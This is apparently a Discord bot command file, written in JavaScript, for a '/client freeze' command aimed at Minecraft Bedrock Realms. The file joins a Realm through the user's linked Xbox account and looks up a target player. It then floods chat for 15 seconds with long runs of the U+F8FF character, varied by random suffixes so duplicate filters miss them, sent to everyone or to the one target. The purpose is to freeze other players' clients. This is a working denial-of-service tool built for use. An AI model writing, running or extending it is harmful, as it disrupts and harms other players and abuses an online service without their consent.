'use strict'

const { SlashCommandBuilder, ApplicationIntegrationType, InteractionContextType } = require('discord.js')

const { XboxAccount } = require('../stuff/api/xbox/xbox')
const { RealmAPI, assertRealmJoinable } = require('../stuff/api/realm/realm')
const { getAccountByDiscordId } = require('../database/models/account')
const { connectToRealm, disconnectFromRealm, hasActiveConnection } = require('../stuff/bedrockx/index')
const { getRelay } = require('../stuff/bedrockx/chatRelay')
const { isValidRealmCode, isValidRealmId } = require('../stuff/utils/validation')
const { blockIfWhitelisted } = require('../stuff/utils/whitelistGuard')
const { successContainer, errorContainer, infoContainer, ComponentsV2Flags } = require('../stuff/utils/containers')
const logger = require('../stuff/utils/logger')

const FREEZE_CHAR = '\uF8FF'
const DURATION_MS = 15000
const INTERVAL_MS = 25
const PER_TICK = 130
const SUFFIX_LEN = 5
const SUFFIX_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
const LOOKUP_TIMEOUT_MS = 20000
const POLL_INTERVAL_MS = 250

function normalizeConnection(raw) {
    if (raw.networkProtocol === 'DEFAULT') {
        const [ip, port] = raw.address.split(':')
        return { transport: 'DEFAULT', ip, port: Number(port) }
    }
    if (raw.networkProtocol === 'NETHERNET' || raw.networkProtocol === 'NETHERNET_JSONRPC') {
        return { transport: raw.networkProtocol, networkId: raw.address }
    }
    throw new Error(`Unrecognized realm connection response (networkProtocol: ${raw.networkProtocol})`)
}

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms))
}

function randomSuffix() {
    let out = ''
    for (let i = 0; i < SUFFIX_LEN; i++) {
        out += SUFFIX_ALPHABET[Math.floor(Math.random() * SUFFIX_ALPHABET.length)]
    }
    return out
}

function looksLikeXuid(value) {
    return /^\d{15,20}$/.test(String(value).trim())
}

function cleanName(value) {
    if (value === undefined || value === null) return undefined
    const str = String(value).replace(/\u00a7[0-9a-zA-Zk-or]/g, '').trim()
    return str.length > 0 ? str : undefined
}

function pickName(record, key) {
    if (!record) return typeof key === 'string' ? cleanName(key) : undefined
    return cleanName(
        record.username ??
        record.name ??
        record.display_name ??
        record.displayName ??
        record.gamertag ??
        record.playerName ??
        (typeof key === 'string' ? key : undefined)
    )
}

function pickXuid(record) {
    if (!record) return undefined
    const raw = record.xbox_user_id ?? record.xboxUserId ?? record.xuid ?? record.XUID ?? record.uuid_xuid
    if (raw === undefined || raw === null) return undefined
    const str = String(raw).trim()
    return looksLikeXuid(str) ? str : undefined
}

function createTracker(client) {
    const byName = new Map()
    const byXuid = new Map()
    let listSeen = false

    const add = (record, key) => {
        const name = pickName(record, key)
        const xuid = pickXuid(record)
        if (!name && !xuid) return
        const entry = { name, xuid }
        if (name) byName.set(name.toLowerCase(), entry)
        if (xuid) byXuid.set(xuid, entry)
    }

    const remove = (record, key) => {
        const name = pickName(record, key)
        const xuid = pickXuid(record)
        if (name) byName.delete(name.toLowerCase())
        if (xuid) byXuid.delete(xuid)
    }

    const seedFromClient = () => {
        const sources = [client.players, client.playerList, client.playerlist, client.entities?.players, client.playerMap]
        for (const raw of sources) {
            if (!raw) continue
            if (typeof raw.forEach === 'function' && !Array.isArray(raw)) {
                raw.forEach((entry, key) => add(entry, key))
            } else if (Array.isArray(raw)) {
                for (const entry of raw) add(entry)
            } else if (typeof raw === 'object') {
                for (const [key, entry] of Object.entries(raw)) add(entry, key)
            }
        }
    }

    const handlePlayerList = (packet) => {
        if (!packet) return
        const container = packet.records ?? packet
        const type = container?.type ?? container?.action ?? packet?.type ?? packet?.action
        const list = container?.records || container?.entries || (Array.isArray(container) ? container : [])
        if (!Array.isArray(list) || list.length === 0) return
        listSeen = true
        const removing = type === 'remove' || type === 1 || type === 'REMOVE'
        for (const record of list) {
            if (removing) remove(record)
            else add(record)
        }
    }

    const onNamedPacket = (name, params) => {
        if (name === 'player_list') handlePlayerList(params)
        else if (name === 'add_player') {
            listSeen = true
            add(params)
        }
    }

    client.on('player_list', handlePlayerList)
    client.on('add_player', (packet) => {
        listSeen = true
        add(packet)
    })
    client.on('packet', (packet) => {
        const name = packet?.data?.name ?? packet?.name
        const params = packet?.data?.params ?? packet?.params ?? packet
        if (typeof name === 'string') onNamedPacket(name, params)
    })
    client.on('spawn', seedFromClient)

    seedFromClient()

    return {
        get listSeen() {
            return listSeen || byName.size > 0 || byXuid.size > 0
        },
        names() {
            seedFromClient()
            return [...new Set([...byName.values(), ...byXuid.values()].map((entry) => entry.name).filter(Boolean))]
        },
        find(target) {
            seedFromClient()
            if (target.xuid && byXuid.has(target.xuid)) return byXuid.get(target.xuid)
            if (target.name) {
                const direct = byName.get(target.name.toLowerCase())
                if (direct) return direct
            }
            return null
        },
    }
}

async function readRealmPlayers(realmApi, realmId) {
    const attempts = [
        () => realmApi.getOnlinePlayers?.(realmId),
        () => realmApi.getRealmPlayers?.(realmId),
        () => realmApi.getLivePlayers?.(realmId),
        () => realmApi.getRealmById?.(realmId).then((realm) => realm?.players),
    ]
    for (const attempt of attempts) {
        try {
            const result = await attempt()
            if (!result) continue
            const list = Array.isArray(result) ? result : (result.players || result.servers || [])
            if (Array.isArray(list) && list.length > 0) return list
        } catch (error) {
            logger.error(`[/client freeze] Realm player lookup failed: ${error.message}`)
        }
    }
    return []
}

function matchRealmPlayers(list, target) {
    for (const record of list) {
        const name = pickName(record)
        const xuid = pickXuid(record) ?? (looksLikeXuid(record?.uuid) ? String(record.uuid) : undefined)
        const online = record?.online === undefined ? true : Boolean(record.online)
        if (!online) continue
        if (target.xuid && xuid && xuid === target.xuid) return { name, xuid }
        if (target.name && name && name.toLowerCase() === target.name.toLowerCase()) return { name, xuid }
    }
    return null
}

async function callFirst(owner, methods, arg) {
    if (!owner) return undefined
    for (const method of methods) {
        const fn = owner[method]
        if (typeof fn !== 'function') continue
        try {
            const result = await fn.call(owner, arg)
            if (result !== undefined && result !== null && result !== false) return result
        } catch (error) {
            continue
        }
    }
    return undefined
}

function extractGamertag(value) {
    if (value === undefined || value === null) return undefined
    if (typeof value === 'string' || typeof value === 'number') return cleanName(value)
    if (Array.isArray(value)) {
        for (const entry of value) {
            const found = extractGamertag(entry)
            if (found) return found
        }
        return undefined
    }
    if (typeof value !== 'object') return undefined
    const direct = value.gamertag ?? value.Gamertag ?? value.modernGamertag ?? value.uniqueModernGamertag ?? value.displayName ?? value.name ?? value.username
    if (typeof direct === 'string' && cleanName(direct)) return cleanName(direct)
    if (Array.isArray(value.settings)) {
        for (const setting of value.settings) {
            const id = setting?.id ?? setting?.Id
            if (id === 'Gamertag' || id === 'ModernGamertag' || id === 'GameDisplayName') {
                const found = cleanName(setting?.value ?? setting?.Value)
                if (found) return found
            }
        }
    }
    const nested = value.profileUsers ?? value.ProfileUsers ?? value.people ?? value.users ?? value.profile ?? value.data ?? value.result
    if (nested) return extractGamertag(nested)
    return undefined
}

async function getXblToken(account) {
    const authflow = account?.authflow
    if (!authflow || typeof authflow.getXboxToken !== 'function') return undefined
    try {
        const token = await authflow.getXboxToken()
        if (!token) return undefined
        const hash = token.userHash ?? token.DisplayClaims?.xui?.[0]?.uhs
        const xsts = token.XSTSToken ?? token.Token ?? token.token
        if (!hash || !xsts) return undefined
        return `XBL3.0 x=${hash};${xsts}`
    } catch (error) {
        return undefined
    }
}

async function fetchGamertagFromXbl(account, xuid) {
    const authorization = await getXblToken(account)
    if (!authorization) return undefined
    try {
        const response = await fetch('https://profile.xboxlive.com/users/batch/profile/settings', {
            method: 'POST',
            headers: {
                Authorization: authorization,
                'x-xbl-contract-version': '3',
                'Accept-Language': 'en-US',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ userIds: [String(xuid)], settings: ['Gamertag', 'ModernGamertag', 'GameDisplayName'] }),
        })
        if (!response.ok) return undefined
        const payload = await response.json()
        const profiles = payload?.profileUsers ?? payload?.ProfileUsers
        if (!Array.isArray(profiles)) return undefined
        const profile = profiles.find((entry) => String(entry?.id ?? entry?.xuid ?? entry?.XUID ?? '') === String(xuid))
        return extractGamertag(profile)
    } catch (error) {
        return undefined
    }
}

async function resolveGamertagByXuid(account, xuid) {
    if (typeof account?.fetchGamertagsByXuids === 'function') {
        try {
            const results = await account.fetchGamertagsByXuids([String(xuid)])
            const exact = results instanceof Map
                ? results.get(String(xuid))
                : results?.[String(xuid)]
            const name = cleanName(exact)
            if (name) return name
        } catch (error) {
        }
    }

    const viaAccount = await callFirst(account, [
        'getGamertagByXuid',
        'fetchGamertagByXuid',
        'gamertagFromXuid',
        'getProfileByXuid',
        'fetchProfileByXuid',
        'lookupXuid',
    ], xuid)

    if (viaAccount && typeof viaAccount === 'object') {
        const returnedXuid = pickXuid(viaAccount) ?? viaAccount.id
        if (returnedXuid !== undefined && String(returnedXuid) === String(xuid)) {
            const name = extractGamertag(viaAccount)
            if (name) return name
        }
    }

    return await fetchGamertagFromXbl(account, xuid)
}

async function resolveTarget(account, input) {
    const value = String(input).trim()
    if (looksLikeXuid(value)) {
        const name = await resolveGamertagByXuid(account, value)
        return { xuid: value, name }
    }
    let xuid
    const looked = await callFirst(account, [
        'getXuidByGamertag',
        'fetchXuid',
        'resolveXuid',
        'xuidFromGamertag',
        'getXuid',
    ], value)
    const candidate = typeof looked === 'object' && looked !== null
        ? (looked.xuid ?? looked.xboxUserId ?? looked.xbox_user_id ?? looked.id)
        : looked
    if (candidate !== undefined && candidate !== null && looksLikeXuid(candidate)) xuid = String(candidate).trim()
    return { xuid, name: value }
}

async function waitForPlayer(tracker, realmApi, realmId, target, timeoutMs) {
    const deadline = Date.now() + timeoutMs
    let lastApiCheck = 0
    while (Date.now() < deadline) {
        const found = tracker.find(target)
        if (found) return found

        if (Date.now() - lastApiCheck > 3000) {
            lastApiCheck = Date.now()
            const apiList = await readRealmPlayers(realmApi, realmId)
            const apiMatch = matchRealmPlayers(apiList, target)
            if (apiMatch) return apiMatch
        }

        await sleep(POLL_INTERVAL_MS)
    }
    return tracker.find(target)
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName('client')
        .setDescription('Client side operations')
        .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
        .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel])
        .addSubcommand((sub) => sub
            .setName('freeze')
            .setDescription('Freeze clients on a Realm')
            .addStringOption((option) => option
                .setName('destination')
                .setDescription('Realm code or realm id')
                .setRequired(true))
            .addStringOption((option) => option
                .setName('mode')
                .setDescription('Who to target')
                .setRequired(true)
                .addChoices(
                    { name: 'everyone', value: 'everyone' },
                    { name: 'player', value: 'player' },
                ))
            .addStringOption((option) => option
                .setName('username')
                .setDescription('Target gamertag or XUID (required when mode is player)')
                .setRequired(false))),

    async execute(interaction) {
        if (interaction.options.getSubcommand() !== 'freeze') return

        await interaction.deferReply()

        const destination = interaction.options.getString('destination').trim()
        const mode = interaction.options.getString('mode')
        const username = (interaction.options.getString('username') || '').trim()

        const isId = isValidRealmId(destination)
        const isCode = isValidRealmCode(destination)

        if (isId && await blockIfWhitelisted(interaction, destination)) return

        if (!isId && !isCode) {
            await interaction.editReply({ components: [errorContainer('Invalid Realm information', 'The value you provided is not a valid Realm code or Realm ID.')], flags: ComponentsV2Flags })
            return
        }

        if (mode === 'player' && !username) {
            await interaction.editReply({ components: [errorContainer('Missing target', 'You must provide a gamertag or XUID when mode is set to player.')], flags: ComponentsV2Flags })
            return
        }

        const linkedAccount = await getAccountByDiscordId(interaction.user.id)
        if (!linkedAccount) {
            await interaction.editReply({ components: [errorContainer('No linked account', 'You need to link your Minecraft account first using /account link.')], flags: ComponentsV2Flags })
            return
        }

        if (getRelay(interaction.user.id)) {
            await interaction.editReply({ components: [errorContainer('Already running', 'You already have a running operation. Try /cancel first.')], flags: ComponentsV2Flags })
            return
        }

        if (isId && hasActiveConnection(interaction.user.id, destination)) {
            await interaction.editReply({ components: [errorContainer('Already running', 'You already have a running operation. Try /cancel first.')], flags: ComponentsV2Flags })
            return
        }

        await interaction.editReply({ components: [infoContainer('Connecting', 'Connecting to the Realm, this may take a moment.')], flags: ComponentsV2Flags })

        const account = new XboxAccount(interaction.user.id)
        let realmId

        try {
            const realmApi = new RealmAPI(account)
            await realmApi.init()

            const realm = isId
                ? await realmApi.getRealmById(destination)
                : await realmApi.getRealmByCode(destination)

            if (!realm) {
                await interaction.editReply({ components: [errorContainer('Invalid Realm information', isId ? 'No Realm was found for the provided ID.' : 'No Realm was found for the provided code.')], flags: ComponentsV2Flags })
                return
            }

            if (await blockIfWhitelisted(interaction, realm.id)) return
            assertRealmJoinable(realm)

            realmId = String(realm.id)

            if (!isId && hasActiveConnection(interaction.user.id, realmId)) {
                await interaction.editReply({ components: [errorContainer('Already running', 'You already have a running operation. Try /cancel first.')], flags: ComponentsV2Flags })
                return
            }

            let target = null
            if (mode === 'player') {
                target = await resolveTarget(account, username)
            }

            const rawConnection = await realmApi.getConnectionInfo(realm.id)
            const connection = normalizeConnection(rawConnection)
            const deviceProfile = account.getDeviceProfile()
            const gamertag = await account.fetchGamertag().catch(() => undefined)

            const client = await connectToRealm(interaction.user.id, realmId, account.authflow, connection, deviceProfile)
            client.username = gamertag ?? ''
            client.profile = { xuid: account.xuid }

            const tracker = createTracker(client)

            let resolvedName = username
            if (mode === 'player') {
                const label = target.name ?? target.xuid
                await interaction.editReply({ components: [infoContainer('Checking player list', `Checking if **${label}** is online on **${realm.name}**.`)], flags: ComponentsV2Flags })

                const found = await waitForPlayer(tracker, realmApi, realm.id, target, LOOKUP_TIMEOUT_MS)

                if (!found) {
                    disconnectFromRealm(interaction.user.id, realmId, 'Target not online')
                    const seen = tracker.names()
                    const detail = seen.length > 0
                        ? `**${label}** is not currently online on **${realm.name}**. Online right now: ${seen.join(', ')}.`
                        : `**${label}** is not currently online on **${realm.name}**. Nothing was done.`
                    await interaction.editReply({ components: [errorContainer('Player not online', detail)], flags: ComponentsV2Flags })
                    return
                }

                resolvedName = found.name ?? target.name
                if (!resolvedName && (found.xuid || target.xuid)) {
                    resolvedName = await resolveGamertagByXuid(account, found.xuid ?? target.xuid)
                }
                if (!resolvedName) {
                    const retry = tracker.find(target)
                    resolvedName = retry?.name
                }
                if (!resolvedName) {
                    const apiList = await readRealmPlayers(realmApi, realm.id)
                    resolvedName = matchRealmPlayers(apiList, { xuid: found.xuid ?? target.xuid, name: target.name })?.name
                }
                if (!resolvedName) {
                    disconnectFromRealm(interaction.user.id, realmId, 'Target name unresolved')
                    await interaction.editReply({ components: [errorContainer('Could not resolve gamertag', `The player with XUID **${target.xuid}** is online, but their gamertag could not be resolved.`)], flags: ComponentsV2Flags })
                    return
                }
            }

            const iterations = Math.ceil(DURATION_MS / INTERVAL_MS)
            const endAt = Math.floor((Date.now() + DURATION_MS) / 1000)
            const targetLabel = mode === 'everyone' ? 'everyone' : `**${resolvedName}**`

            await interaction.editReply({ components: [infoContainer('Freezing', `Connected to **${realm.name}**. Targeting ${targetLabel}, ends <t:${endAt}:R>.`)], flags: ComponentsV2Flags })

            const payload = FREEZE_CHAR.repeat(PER_TICK)

            for (let i = 0; i < iterations; i++) {
                const suffix = randomSuffix()
                const body = `${payload} | ${suffix}`
                const command = mode === 'everyone'
                    ? `me ${body}`
                    : `tell ${resolvedName} ${body}`
                client.sendCommand(command, 'automationplayer', undefined, false)
                if (i < iterations - 1) await sleep(INTERVAL_MS)
            }

            disconnectFromRealm(interaction.user.id, realmId, 'Freeze complete')

            await interaction.editReply({ components: [successContainer('Freeze sent', `Ran freeze on **${realm.name}** targeting ${targetLabel} for ${DURATION_MS / 1000} second(s).`)], flags: ComponentsV2Flags })
        } catch (error) {
            logger.error(`[/client freeze] Failed for ${interaction.user.id}: ${error.message}`)
            if (realmId) disconnectFromRealm(interaction.user.id, realmId, 'Freeze failed')
            const timedOut = /timed out/i.test(error.message)
            const title = timedOut ? 'Connection timed out' : 'Failed to run freeze'
            const reasonText = error.message && error.message.trim().length > 0
                ? error.message
                : 'The Realm closed the connection and did not give a reason.'
            await interaction.editReply({ components: [errorContainer(title, reasonText)], flags: ComponentsV2Flags })
        }
    }
}
